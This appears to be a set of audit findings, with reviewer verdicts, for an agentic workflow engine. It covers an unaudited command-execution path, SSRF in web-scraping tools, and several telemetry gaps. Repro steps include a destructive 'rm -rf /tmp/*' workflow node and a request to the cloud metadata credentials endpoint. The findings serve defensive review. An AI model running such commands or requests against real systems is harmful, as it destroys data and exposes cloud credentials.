audit-coverage.repro: POST /api/workflows with nodes=[{name:'evil', task_type:'tool_execution', command:'rm -rf /tmp/*', arguments:{}}] then POST /api/workflows/{id}/execute. Engine._execute_node executes the command with no audit; the run_command safety net in agent.py only fires for the in-process agent path, not for the legacy path that runs via Workspace.
audit-coverage.proposedFix: Inject a SecurityAuditor (and ToolRegistry) into Engine.__init__, store on self, and call self._security_auditor.check_deterministic(command) and audit_tool_call(...) inside _execute_node BEFORE the workspace.execute call. Same for _handle_failure compensation. Refuse execution when auditor is None and STRICT_SECURITY_MODE=True.

verdict.reason: The claim is factually accurate in its core assertion: Engine._execute_node (engine.py:458) does pass node.command/arguments directly to workspace.execute without any SecurityAuditor or ToolRegistry check, and Engine._handle_failure (engine.py:723-735) similarly calls comp_workspace.execute(comp_cmd, comp_args) with no audit. However, the claim mislabels this as a "legacy path" — it is the PRIMARY execution path used by POST /api/workflows/{id}/execute (api/app.py:337 calls engine.run_workflow, which is the only path that goes through _execute_node). The OPALoop's audited agent.call_tool path is invoked from a different API surface, not this one. The proposed fix is correct in direction (inject auditor into Engine.__init__ and call audit_tool_call / check_deterministic before workspace.execute) but the 'critical' severity is overstated: (a) LocalTmpWorkspace sandboxes commands to a temp dir as cwd, (b) workspace-level subprocess isolation provides some defense, (c) STRICT_SECURITY_MODE refuses to be a clear criterion. Real bug, moderate severity — not critical.

ssrf.title: SSRF in WebScrapingToolkit - http_get/http_post/scrape_page/download_file accept arbitrary URLs with follow_redirects=True
ssrf.description: http_get (line 139), http_post (line 152), scrape_page (line 164), and download_file (line 186) all accept any URL string from tool arguments and pass it to httpx.AsyncClient with follow_redirects=True. There is no scheme allowlist (file://, gopher://, ftp://, dict:// all reachable), no private-IP block (RFC1918, loopback, link-local, IPv6 ULA), and no DNS rebinding mitigation. An attacker controlling the LLM plan can pivot to internal services (e.g. http://169.254.169.254/latest/meta-data/ for cloud metadata) or read local files via file:// scheme on some httpx builds.
ssrf.repro: Plan with node {command:'http_get', arguments:{url:'http://169.254.169.254/latest/meta-data/iam/security-credentials/'}}. WebScrapingToolkit.execute calls httpx.AsyncClient().get(url, follow_redirects=True) - returns EC2 instance role credentials to the planner.
ssrf.proposedFix: Add a URL validator that (1) restricts scheme to http/https, (2) resolves hostname and rejects private/loopback/link-local/multicast/ULA IP literals, (3) re-resolves after DNS to mitigate rebinding. Apply to all four tools. Drop follow_redirects to False (or whitelist redirect targets through the same validator). Provide a CELESTE_ALLOWED_DOMAINS allowlist env var for opt-in overrides.

verdict.reason: Lines 139, 152, 164, 186 in /Users/tom/src/agentic-dynamic-workflows/src/celeste/toolkits/web_scraping.py pass arbitrary user/planner-supplied URLs to httpx.AsyncClient with no scheme allowlist, no private-IP/loopback/link-local filtering, and no DNS rebinding mitigation. A plan node calling http_get with url=http://169.254.169.254/latest/meta-data/... will reach the EC2 metadata service. Minor inaccuracies in the report: httpx does NOT support file:// (so that specific vector is wrong), and http_post (line 152) does NOT set follow_redirects — but neither inaccuracy undermines the core finding since the SSRF still works without redirects and metadata IPs are reachable. The proposed fix direction (scheme allowlist, resolve-and-reject private IPs, re-resolve to mitigate rebinding, opt-in domain allowlist) is correct and complete. ToolRegistry allowlist covers tool names only, not URL targets, so there is no compensating control elsewhere in the codebase.

correlation-id.title: No correlation/trace IDs propagated across the event ledger
correlation-id.description: TaskEvent and WorkflowEvent rows are linked only by workflow_id + task_node_id + sequence_number/timestamp. There is no `correlation_id`, `trace_id`, `cycle_id`, or `span_id` column. When evaluating a workflow you cannot reconstruct "this NODE_FAILED on cycle 3 from PLAN_GENERATED X". The FeatureDetector in evaluation/detector.py can correlate by ordering but cannot follow causal links across replans and compensations.
correlation-id.repro:
1. Run a workflow that triggers Tier 2 REPLAN (cycle 1 -> cycle 2).
2. Query TaskEvent for the failing node and WorkflowEvent for the PLAN_GENERATED.
3. There is no field linking the two rows - correlation requires timestamp-order heuristics that break under clock skew or parallel cycles.
correlation-id.proposedFix: Add `correlation_id: Mapped[uuid.UUID]` (and optional `parent_event_id` FK) to both `TaskEvent` (models.py:258) and `WorkflowEvent` (models.py:320). Generate a fresh UUID per OPA cycle in opa_loop.py:414 and bind it to all events emitted within that cycle via `_emit_workflow_event(..., correlation_id=cycle_id)`. Also bind cycle_id to NODE_* events emitted from WorkflowExecutor (opa_loop.py:239-276).

verdict.reason: Confirmed: TaskEvent and WorkflowEvent have no correlation_id/cycle_id column. Correlation relies on (workflow_id, sequence_number) monotonic ordering and event_data['cycle'] payload field, which is not indexable. The detector explicitly orders by sequence_number and infers cycle from event_data. However, the proposed fix is overscoped: it mischaracterizes the existing cycle counter (an int, not a UUID), adds a redundant parent_event_id FK, and overstates severity given that sequence_number already provides total per-workflow ordering. The defect is real but the fix needs redesign (use int cycle_id matching existing cycle_count, or add cycle_id as the indexed column rather than a UUID).

metrics.title: OPA loop token usage is a hard-coded heuristic, not actual usage
metrics.description: `llm_tokens_accumulated += 100` at opa_loop.py:403 and 797 is a hand-coded heuristic, not actual usage from the LLM client. Planner tokens ARE captured at opa_loop.py:480 via `fragment._usage` but evaluator tokens (opaloop.py:535 - `_evaluator.evaluate(fragment, goal)`) are NEVER harvested - the Evaluator's LLMResponse is discarded by `Evaluator.evaluate` at evaluator.py:202-210 which returns only the parsed EvaluatorDecision. Likewise OBSERVATION snapshot calls and SECURITY_AUDIT LLM calls (security_auditor.py:241) discard their LLMResponse.
metrics.repro:
1. Run a workflow that goes through 3 cycles with 2 evaluations each.
2. Inspect Workflow.llm_tokens_accumulated after.
3. Value is `100 * cycles + planner_total_tokens` - missing all evaluator, observation, and security-audit tokens. Cost analysis (evaluation/collector.py:97) labels `security_tokens=0` ("Not yet instrumented").
metrics.proposedFix: Modify Evaluator.evaluate (evaluator.py:175) to return a tuple `(EvaluatorDecision, LLMResponse)` and have OPALoop harvest tokens at opa_loop.py:535. Same for observation `agent.call_tool("snapshot", {})` at opa_loop.py:424 - expose `_usage` on the result dict. Security auditor at security_auditor.py:241 should return `(SecurityVerdict, LLMResponse)` and OPALoop should accumulate tokens at opa_loop.py:507 in `_emit_security_audit_events`. Replace the `+= 100` heuristic with a fallback only when no usage metadata is present.

verdict.reason: The bug claim is factually accurate. opa_loop.py:401-403 contains a comment-labeled heuristic `+= 100` with the explicit note "In production this would come from actual LLM usage metadata". Evaluator.evaluate (evaluator.py:202-210) indeed calls `self._llm_client.complete(...)` and discards the LLMResponse object, returning only the parsed EvaluatorDecision. _emit_security_audit_events (opa_loop.py:1118) emits SECURITY_AUDIT events but never harvests token usage. The observation `call_tool("snapshot", {})` result dict is also not inspected for `_usage`. Only Planner tokens are actually harvested (lines 478-485). The repro is realistic and matches the code. The proposed fix is correct in direction but would require a coordinated refactor across evaluator.py, security_auditor.py, and opa_loop.py. Severity of 'high' is justified because token-based billing/escalation decisions depend on this metric, and the comment explicitly flags this as unfinished work rather than intentional behavior.

metrics.title: Evaluator.evaluate discards LLMResponse - no token usage or finish_reason captured
metrics.description: Evaluator.evaluate at evaluator.py:202 calls `self._llm_client.complete(messages, ...)` and only retains `response.content` via `_parse_response`. The `response.usage` dict (prompt/completion/total tokens), `response.finish_reason`, and `response.model` are all discarded. OPALoop.run at opa_loop.py:535 calls `_evaluator.evaluate(fragment, goal)` and harvests no metrics from it. Combined with OBS-004, this means evaluator calls (which are roughly 1 LLM call per OPA cycle) are completely invisible in cost dashboards.
metrics.repro:
1. Add a print statement to Evaluator.evaluate: `print(response.usage, response.finish_reason)`.
2. Run any workflow.
3. Nothing prints - the usage dict is dropped.
4. Token accounting for evaluator LLM calls is zero.
metrics.proposedFix: Change Evaluator.evaluate signature to return `tuple[EvaluatorDecision, LLMResponse]`. Update OPALoop.run (opa_loop.py:535) and OPALoop.resume (opa_loop.py:927) to unpack the tuple and add `response.usage["total_tokens"]` to `llm_tokens_accumulated`. Also include `response.finish_reason` in the EVALUATION_RESULT event_data so consumers can detect truncated evaluations.

verdict.reason: The bug is confirmed by direct code inspection. At evaluator.py:202-208, `await self._llm_client.complete(...)` returns an `LLMResponse` whose fields include `usage` (dict with prompt/completion/total tokens), `finish_reason`, and `model` (see base.py:67-74). Only `response.content` is consumed via `_parse_response`; usage/finish_reason/model are never read, returned, or emitted. OPALoop.run (opa_loop.py:535) and OPALoop.resume (opa_loop.py:927) both call `await self._evaluator.evaluate(fragment, goal)` and then immediately access only `decision.name` and `decision.reason` — the LLMResponse is dropped on the floor. The EVALUATION_RESULT event_data emitted at opa_loop.py ~543 and ~936 contains only cycle/decision/reason, no token usage. While the planner path (opa_loop.py:482 and ~879) does accumulate `llm_tokens_accumulated += total_tokens`, the evaluator call adds zero to that counter. The repro (adding `print(response.usage, response.finish_reason)`) is realistic and would produce empty output for cached evaluations and populated-but-discarded output otherwise. The proposed fix is correct and complete in shape: returning `tuple[EvaluatorDecision, LLMResponse]`, harvesting `response.usage["total_tokens"]`, and surfacing `finish_reason` in the event would close the gap. Severity "high" is reasonable since evaluator calls happen every OPA cycle, so they represent a meaningful and recurring fraction of total LLM cost that is invisible to dashboards and budget enforcement (max_llm_tokens check at opa_loop.py:404/797).

metrics.title: No node-level retry metric - retry_count on TaskNode exists but is never incremented
metrics.description: TaskNode.retry_count (models.py:227) and TaskNode.max_retries (models.py:228) are declared columns but no code path increments retry_count. The legacy Engine.run_workflow path has no retry logic at all - a failed node immediately triggers compensation. Only OPALoop._execute_with_retries (opa_loop.py:1146) performs retries, but it operates on fragment-level retries (reissuing the whole fragment), not node-level. The Tier 1 retry metric is invisible.
metrics.repro:
1. Trigger a transient tool failure in OPALoop path.
2. _execute_with_retries runs up to 3 attempts.
3. After success, retry_count on TaskNode stays at 0.
4. No metric distinguishes "node succeeded on first try" from "node succeeded on retry 3".
metrics.proposedFix: In WorkflowExecutor.execute_fragment (opa_loop.py:194), when retrying via _execute_with_retries, persist `TaskNode.retry_count += 1` on each retry attempt. Add a new TaskEvent type RETRY_ATTEMPTED = "retry_attempted" (and corresponding enum entry) emitted at each retry. Add `retry_count` and `had_retries` fields to WorkflowMetricsResponse. This is the only way to detect flapping tools.

verdict.reason: The bug is real. `TaskNode.retry_count` (models.py:227) is a declared column that is never incremented anywhere in the production codebase. The only references are: (1) the test file `tests/test_models.py:251,266,273,284` which manually sets/asserts the value, and (2) `models.py:227` itself. `_execute_with_retries` (opa_loop.py:1146) implements fragment-level retry via a `for attempt in range(max_retries + 1)` loop but never persists per-node retry state. The proposed fix is correct and the severity (medium) is appropriate — this is a real observability gap that defeats the stated purpose of Tier 1 retry metrics, not intentional behavior. Note: `max_retries` IS preserved during checkpoint resume (engine.py:901), but `retry_count` is silently dropped during the same copy, which is a related symptom of the same gap.

metrics.title: Engine._execute_node captures stdout but not stderr from workspace events
metrics.description: Engine._execute_node at engine.py:494 handles `event.event_type == "stdout_line"` but ignores `"stderr_line"`. The WorkspaceEvent contract (workspaces/base.py:24) declares `execution_failed`, `stdout_line`, `error_occurred`, `execution_completed` and DockerWorkspace emits `stderr_line` events (docker.py:143, 164). These are queued to `_event_queue` at engine.py:493 but never persisted to TaskNode.outputs, never aggregated for metrics, and lost on workflow completion. Operators cannot see what a node wrote to stderr unless the command exited non-zero.
metrics.repro:
1. Run a node that prints warnings to stderr then exits 0.
2. TaskNode.outputs contains only stdout_lines.
3. No way to retrieve the stderr stream from the workflow event log.
metrics.proposedFix: In engine.py:492-500, branch on event.event_type in ("stdout_line", "stderr_line") and append both to separate `stdout_lines` / `stderr_lines` lists. Persist them as `node.outputs = {"stdout": ..., "stderr": ...}` on completion. Optionally add a `stderr_lines_count` to the runtime metrics so operators can spot tools that produce excessive stderr noise.

verdict.reason: The bug exists. Engine._execute_node at engine.py:494 only branches on event.event_type == "stdout_line", while DockerWorkspace.emit (docker.py:143, 164) yields WorkspaceEvents with event_type "stderr_line" that flow through _event_queue but are never appended to output_lines, never persisted to TaskNode.outputs, and never aggregated. However, the finding's framing slightly overstates universality: (1) The shared _stream_subprocess_events helper in base.py:79 actually mislabels stderr lines as "stdout_line" for LocalTmpWorkspace and GitWorktreeWorkspace, so for non-Docker workspaces stderr is conflated with stdout (a separate bug) rather than dropped. (2) The WorkspaceEvent dataclass docstring at base.py:25 does not list "stderr_line" as a recognized event type — only "stdout_line", "error_occurred", "execution_completed", "execution_failed" — so the engine.py handling is consistent with the documented contract. The repro is realistic for DockerWorkspace specifically. The proposed fix (branch on both event types, persist as node.outputs["stdout"]/["stderr"], optionally track stderr_lines_count) is correct and complete. Severity "low" is appropriate because stderr content is still available to the event-queue consumer and only DockerWorkspace users experience the loss; the failure case still captures stderr in the execution_failed event payload.

ledger-completeness.title: STATE_CHECKPOINT event type defined but never emitted anywhere
ledger-completeness.description: TaskEventType.STATE_CHECKPOINT is declared in the enum and FeatureDetector.detect_checkpoint (evaluation/detector.py:195) queries for it, but no code path emits it. CheckpointManager.record_checkpoint_event (checkpoint.py:136) only emits CHECKPOINT, never STATE_CHECKPOINT. As a result `CheckpointEvidence.recovery_count` is always 0 and `state_hash_match` is always None.

silent-failure.title: schema.sql uses PRAGMA foreign_keys=ON, but the load.py splits on `;` and ignores PRAGMA statements (load.py:184) — silently dropped
